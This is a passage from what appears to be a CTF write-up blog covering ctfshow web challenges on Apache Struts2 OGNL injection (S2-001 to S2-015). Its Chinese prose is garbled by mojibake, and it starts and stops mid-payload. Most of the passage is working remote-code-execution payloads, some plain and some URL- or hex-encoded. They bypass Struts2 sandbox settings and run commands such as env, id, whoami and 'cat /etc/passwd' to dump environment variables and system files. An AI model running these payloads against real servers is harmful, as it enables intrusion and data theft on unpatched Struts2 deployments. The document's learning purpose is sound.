class="string">&quot;tomcatBinDir&#123;&quot;</span>+@java.lang.System@getProperty(<span class="string">&quot;user.dir&quot;</span>)+<span class="string">&quot;&#125;&quot;</span>&#125;</span></span><br><span class="line"></span><br><span class="line">// è·å–webè·¯å¾„</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&#123;<span class="comment">#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span></span></span><br><span class="line"></span><br><span class="line">// å‘½ä»¤æ‰§è¡Œ envï¼Œflagå°±åœ¨å…¶ä¸­</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690894841073-47f7327b-4cdc-46d9-9821-109faa25e90e.png" alt="image.png"><br>urlè½¬ä¹‰ä¸€ä¸‹ã€‚<br>è¿™ä¸ªç”¨struts2scanå·¥å…·æ‰«æï¼Œä½†æ˜¯æ— æ³•æ£€æµ‹å‡ºæ¼æ´ï¼Œè¿™é‡Œä¸æ¸…æ¥šä¸ºä»€ä¹ˆã€‚<br>ctfshowè¿™ä¸ªé¶åœºçš„ç”¨ä¸äº†ï¼Œä½†æ˜¯vulhubè‡ªå·±æ­å°±å¯ä»¥ã€‚ä½†æ˜¯ä¸¤ä¸ªéƒ½æ— æ³•è¿›è¡Œæ¼æ´åˆ©ç”¨ï¼ˆè¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ï¼‰<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690898715564-49bc97ef-53b3-4a51-a792-d439165e1f2f.png" alt="image.png"><br>è¿™é‡Œæ¢äº†ä¸€ä¸ªå·¥å…·ï¼Œä½†æ˜¯ä¹Ÿæ˜¯ä¸èƒ½ç”¨001ï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œ016äº†ã€‚</p><blockquote><p><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></blockquote><h1 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h1><h3 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h3><p>Struts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œ,è€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœ<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.0.11.2<br>pocï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?(&#x27;\u0023context[\&#x27;xwork.MethodAccessor.denyMethodExecution\&#x27;]\u003dfalse&#x27;)(bla)(bla)&amp;(&#x27;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&#x27;)(kxlzx)(kxlzx)&amp;(&#x27;\u0023mycmd\u003d\&#x27;ifconfig\&#x27;&#x27;)(bla)(bla)&amp;(&#x27;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&#x27;)(bla)(bla)&amp;(A)((&#x27;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&#x27;)(bla))&amp;(B)((&#x27;\u0023myres\u003dnew\40byte[51020]&#x27;)(bla))&amp;(C)((&#x27;\u0023mydat.readFully(\u0023myres)&#x27;)(bla))&amp;(D)((&#x27;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&#x27;)(bla))&amp;(&#x27;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&#x27;)(bla)(bla)&amp;(E)((&#x27;\u0023myout.getWriter().println(\u0023mystr)&#x27;)(bla))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»–ç»™çš„è¿™ä¸ªpocä¹Ÿä¸å¤ªèƒ½ç”¨<br>è¿™é‡Œç›´æ¥ç”¨å·¥å…·äº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900144282-73dea694-41b3-47e5-aff2-63823b79a439.png" alt="image.png"><br>é‚£ä¸ªstruts2scanæ˜¯çœŸä¸å¥½ç”¨å•Šã€‚å„ç§è¯¯åˆ¤ã€‚</p><h1 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h1><h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><p>å½“é…ç½®äº†éªŒè¯è§„åˆ™ <ActionName>-validation.xml æ—¶ï¼Œè‹¥ç±»å‹éªŒè¯è½¬æ¢å‡ºé”™ï¼Œåç«¯é»˜è®¤ä¼šå°†ç”¨æˆ·æäº¤çš„è¡¨å•å€¼é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç„¶åæ‰§è¡Œä¸€æ¬¡ OGNL è¡¨è¾¾å¼è§£æå¹¶è¿”å›<br>å½±å“ç‰ˆæœ¬ï¼šStruts2 2.0.0 - Struts2 2.2.3<br>pocï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;printenv | grep FLAG&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690900949819-59a428bb-9741-40bb-85c4-9e8396a2b2e5.png" alt="image.png"></p><h1 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h1><h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><p>S2-008 æ¶‰åŠå¤šä¸ªæ¼æ´ï¼ŒCookie æ‹¦æˆªå™¨é”™è¯¯é…ç½®å¯é€ æˆ OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºå¤§å¤š Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰å¯¹ Cookie åç§°éƒ½æœ‰å­—ç¬¦é™åˆ¶ï¼Œä¸€äº›å…³é”®å­—ç¬¦æ— æ³•ä½¿ç”¨ä½¿å¾—è¿™ä¸ªç‚¹æ˜¾å¾—æ¯”è¾ƒé¸¡è‚‹ã€‚å¦ä¸€ä¸ªæ¯”è¾ƒé¸¡è‚‹çš„ç‚¹å°±æ˜¯åœ¨ struts2 åº”ç”¨å¼€å¯ devMode æ¨¡å¼åä¼šæœ‰å¤šä¸ªè°ƒè¯•æ¥å£èƒ½å¤Ÿç›´æ¥æŸ¥çœ‹å¯¹è±¡ä¿¡æ¯æˆ–ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæ­£å¦‚ kxlzx æ‰€æè¿™ç§æƒ…å†µåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å‡ ä¹ä¸å¯èƒ½å­˜åœ¨ï¼Œå› æ­¤å°±å˜å¾—å¾ˆé¸¡è‚‹çš„ï¼Œä½†æˆ‘è®¤ä¸ºä¹Ÿä¸æ˜¯ç»å¯¹çš„ï¼Œä¸‡ä¸€è¢«é»‘äº†ä¸“é—¨ä¸¢äº†ä¸€ä¸ªå¼€å¯äº† debug æ¨¡å¼çš„åº”ç”¨åˆ°æœåŠ¡å™¨ä¸Šä½œä¸ºåé—¨ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.1.0 - Struts 2.3.1</p><h2 id="å§¿åŠ¿1"><a href="#å§¿åŠ¿1" class="headerlink" title="å§¿åŠ¿1"></a>å§¿åŠ¿1</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:(&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;)(1)(2)=Aluvion; (&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;)(1)(2)=Twings;</span><br></pre></td></tr></table></figure><p>æ²¡æˆåŠŸ</p><h2 id="å§¿åŠ¿2"><a href="#å§¿åŠ¿2" class="headerlink" title="å§¿åŠ¿2"></a>å§¿åŠ¿2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27printenv%20%7C%20grep%20FLAG%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¯ä»¥<br>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨S2-016ç›´æ¥æ¢­</p><h1 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h1><h3 id="S2-009"><a href="#S2-009" class="headerlink" title="S2-009"></a>S2-009</h3><p>è¿™ä¸ªæ¼æ´å†æ¬¡æ¥æºäºs2-003ã€s2-005<br>å‚è€ƒStruts2æ¼æ´åˆ†æä¹‹Ognlè¡¨è¾¾å¼ç‰¹æ€§å¼•å‘çš„æ–°æ€è·¯ï¼Œæ–‡ä¸­è¯´åˆ°ï¼Œè¯¥å¼•å…¥ognlçš„æ–¹æ³•ä¸å…‰å¯èƒ½å‡ºç°åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œä¹Ÿå¯èƒ½å‡ºç°åœ¨å…¶ä»–javaåº”ç”¨ä¸­<br>Struts2å¯¹s2-003çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨ï¼Œåœ¨s2-005ä¸­å¯ç›´æ¥é€šè¿‡OGNLç»•è¿‡è¯¥é™åˆ¶ï¼Œå¯¹äº#å·ï¼ŒåŒæ ·ä½¿ç”¨ç¼–ç \u0023æˆ–\43è¿›è¡Œç»•è¿‡ï¼›äºæ˜¯Struts2å¯¹s2-005çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢\ç­‰ç‰¹æ®Šç¬¦å·ï¼Œä½¿ç”¨æˆ·ä¸èƒ½æäº¤åæ–œçº¿<br>ä½†æ˜¯ï¼Œå¦‚æœå½“å‰actionä¸­æ¥å—äº†æŸä¸ªå‚æ•°exampleï¼Œè¿™ä¸ªå‚æ•°å°†è¿›å…¥OGNLçš„ä¸Šä¸‹æ–‡ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†OGNLè¡¨è¾¾å¼æ”¾åœ¨exampleå‚æ•°ä¸­ï¼Œç„¶åä½¿ç”¨/helloword.acton?example=<OGNL statement>&amp;(example)(â€˜xxxâ€™)=1çš„æ–¹æ³•æ¥æ‰§è¡Œå®ƒï¼Œä»è€Œç»•è¿‡å®˜æ–¹å¯¹#ã€\ç­‰ç‰¹æ®Šå­—ç¬¦çš„é˜²å¾¡<br>é€šè¿‡Struts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åè€Œä¸æ£€æŸ¥å‚æ•°å€¼çš„æ–¹å¼è¿›è¡Œæ„é€ OGNLè¡¨è¾¾å¼ä»è€Œé€ æˆä»£ç æ‰§è¡Œ<br>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.1<br><code>http://your-ip:8080/ajax/example5.action</code>å³å¯è®¿é—®è¯¥æ§åˆ¶å™¨<br>payloadï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901618232-92eccea1-a51d-4e57-96c1-d97ab91b2662.png" alt="image.png"><br>å¯ä»¥ç›´æ¥ä¸‹è½½å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690901903963-8d9c0690-3830-4867-9793-2a5190a1ed1a.png" alt="image.png"></p><h1 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h1><h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><p>å¦‚æœåœ¨é…ç½® Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ UserAction ä¸­å®šä¹‰æœ‰ä¸€ä¸ª name å˜é‡ï¼Œå½“è§¦å‘ redirect ç±»å‹è¿”å›æ—¶ï¼ŒStruts2 è·å–ä½¿ç”¨ ${name} è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹ name å‚æ•°çš„å€¼æ‰§è¡Œ OGNL è¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„ OGNL è¡¨è¾¾å¼å¯¼è‡´å‘½ä»¤æ‰§è¡Œ<br>å½±å“ç‰ˆæœ¬: 2.1.0 - 2.3.13<br>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p>å°†payloadæ”¾å…¥è¾“å…¥æ¡†ä¸­æäº¤ï¼Œå°±å¯ä»¥ä¸‹è½½åˆ°æ–‡æœ¬å†…å®¹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536585259-0819a898-28ff-441e-b5e4-403757ed8f6d.png" alt="image.png"><br>flagåœ¨ç¯å¢ƒé‡Œé¢ï¼Œç›´æ¥æŸ¥çœ‹å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692536905535-1f302ae2-41aa-44af-8576-00ccfff0fd02.png" alt="image.png"></p><h1 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h1><h3 id="S2-013"><a href="#S2-013" class="headerlink" title="S2-013"></a>S2-013</h3><p>Struts2 æ ‡ç­¾ä¸­ <code>&lt;s:a&gt;</code> å’Œ <code>&lt;s:url&gt;</code> éƒ½åŒ…å«ä¸€ä¸ª includeParams å±æ€§ï¼Œå…¶å€¼å¯è®¾ç½®ä¸º noneï¼Œget æˆ– allï¼Œå‚è€ƒå®˜æ–¹å…¶å¯¹åº”æ„ä¹‰å¦‚ä¸‹ï¼š</p><ul><li>none - é“¾æ¥ä¸åŒ…å«è¯·æ±‚çš„ä»»æ„å‚æ•°å€¼ï¼ˆé»˜è®¤ï¼‰</li><li>get - é“¾æ¥åªåŒ…å« GET è¯·æ±‚ä¸­çš„å‚æ•°å’Œå…¶å€¼</li><li>all - é“¾æ¥åŒ…å« GET å’Œ POST æ‰€æœ‰å‚æ•°å’Œå…¶å€¼</li></ul><p>&lt;s:a&gt;ç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªè¶…é“¾æ¥ï¼Œå½“includeParams=allçš„æ—¶å€™ï¼Œä¼šå°†æœ¬æ¬¡è¯·æ±‚çš„GETå’ŒPOSTå‚æ•°éƒ½æ”¾åœ¨URLçš„GETå‚æ•°ä¸Šã€‚åœ¨æ”¾ç½®å‚æ•°çš„è¿‡ç¨‹ä¸­ä¼šå°†å‚æ•°è¿›è¡ŒOGNLæ¸²æŸ“ï¼Œé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´<br>å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.3.14.1<br>pocï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;(#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#a=<span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(<span class="string">&#x27;id&#x27;</span>).getInputStream(),#b=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#a),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#b),#d=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#c.read(#d),#out=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getResponse()</span>.getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ–</span></span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,<span class="meta">@org</span>.apache.commons.io.IOUtils<span class="meta">@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())</span>&#125;</span><br></pre></td></tr></table></figure><p>çœ‹çœ‹payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link.action?a=%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;env&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%dddddddd3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%dd7D</span><br></pre></td></tr></table></figure><p>ï¼ˆä¼¼ä¹ç¬¬äºŒä¸ªç”¨ä¸äº†ï¼Œæµ‹è¯•å¾—ä¸åˆ°rceï¼‰</p><h1 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h1><h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><p>æ¼æ´äº§ç”Ÿäºé…ç½®äº† Action é€šé…ç¬¦ *ï¼Œå¹¶å°†å…¶ä½œä¸ºåŠ¨æ€å€¼æ—¶ï¼Œè§£ææ—¶ä¼šå°†å…¶å†…å®¹æ‰§è¡Œ OGNL è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-015&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®èƒ½è®©æˆ‘ä»¬è®¿é—® name.action æ—¶ä½¿ç”¨ name.jsp æ¥æ¸²æŸ“é¡µé¢ï¼Œä½†æ˜¯åœ¨æå– name å¹¶è§£ææ—¶ï¼Œå¯¹å…¶æ‰§è¡Œäº† OGNL è¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚åœ¨å®è·µå¤ç°çš„æ—¶å€™å‘ç°ï¼Œç”±äº name å€¼çš„ä½ç½®æ¯”è¾ƒç‰¹æ®Šï¼Œä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦å¦‚ / â€œ \ éƒ½æ— æ³•ä½¿ç”¨ï¼ˆè½¬ä¹‰ä¹Ÿä¸è¡Œï¼‰ï¼Œæ‰€ä»¥åœ¨åˆ©ç”¨è¯¥ç‚¹è¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ—¶ä¸€äº›å¸¦æœ‰è·¯å¾„çš„å‘½ä»¤å¯èƒ½æ— æ³•æ‰§è¡ŒæˆåŠŸ<br>è¿˜æœ‰éœ€è¦è¯´æ˜çš„å°±æ˜¯åœ¨ Struts 2.3.14.1 - Struts 2.3.14.2 çš„æ›´æ–°å†…å®¹ä¸­ï¼Œåˆ é™¤äº† SecurityMemberAccess ç±»ä¸­çš„ setAllowStaticMethodAccess æ–¹æ³•ï¼Œå› æ­¤åœ¨ 2.3.14.2 ç‰ˆæœ¬ä»¥åéƒ½ä¸èƒ½ç›´æ¥é€šè¿‡ #_memberAccess[â€˜allowStaticMethodAccessâ€™]=true æ¥ä¿®æ”¹å…¶å€¼è¾¾åˆ°é‡è·é™æ€æ–¹æ³•è°ƒç”¨çš„èƒ½åŠ›<br>å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.14.2<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692537740735-e067567e-b70b-414e-9435-4415d6015bfc.png" alt="image.png"><br>poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream()),#q&#125;.action</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6f%64%41%63%63%65%73%73%6f%72%2e%64%65%6e%79%4d%65%74%68%6f%64%45%78%65%63%75%74%69%6f%6e%27%5d%3d%66%61%6c%73%65%2c%23%6d%3d%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%44%65%63%6c%61%72%65%64%46%69%65%6c%64%28%27%61%6c%6c%6f%77%53%74%61%74%69%63%4d%65%74%68%6f%64%41%63%63%65%73%73%27%29%2c%23%6d%2e%73%65%74%41%63%63%65%73%73%69%62%6c%65%28%74%72%75%65%29%2c%23%6d%2e%73%65%74%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%2c%74%72%75%65%29%2c%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%65%6e%76%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%2c%23%71%7d%2e%61%63%74%69%6f%6e</span><br></pre></td></tr></table></figure><p>å…¨éƒ¨urlç¼–ç ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printenv | grep FLAG</span><br></pre></td></tr></table></figure><p>ä¼¼ä¹flagæ²¡åœ¨envé‡Œé¢ï¼Œæˆ–è€…å¯èƒ½æ˜¯è¾“å‡ºæœ‰é™åˆ¶ã€‚æ„Ÿè§‰æ˜¯è¾“å‡ºæœ‰é™åˆ¶ï¼Œå› ä¸ºç»“å°¾æ²¡æœ‰è¾“å‡ºå®Œå…¨ï¼Œé‚£æ¢ä¸ªæ–¹æ³•ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540843538-b2af1750-19f1-42c0-9349-590ec3e4fa1e.png" alt="image.png"><br>æ°”æ­»æˆ‘äº†ï¼Œæ€ä¹ˆå†™éƒ½è¾“å‡ºä¸æ¥ååŠæ®µæ€»æ˜¯è¯†åˆ«ä¸å‡ºæ¥ã€‚å¦ˆçš„å·¥å…·ä¸€æŠŠå—¦ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692540864123-aea0c64b-79f9-4d6a-8fe3-e5be0d1ef63c.png" alt="image.png"><br>å¦ˆçš„ ä¸Šé¢é‚£ä¸ªpayloadé‡æ–°å¯åŠ¨å®¹å™¨å°±okäº†ï¼š<br>URLè½¬ä¹‰ä¸‹æ–¹å†…å®¹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;printenv | grep 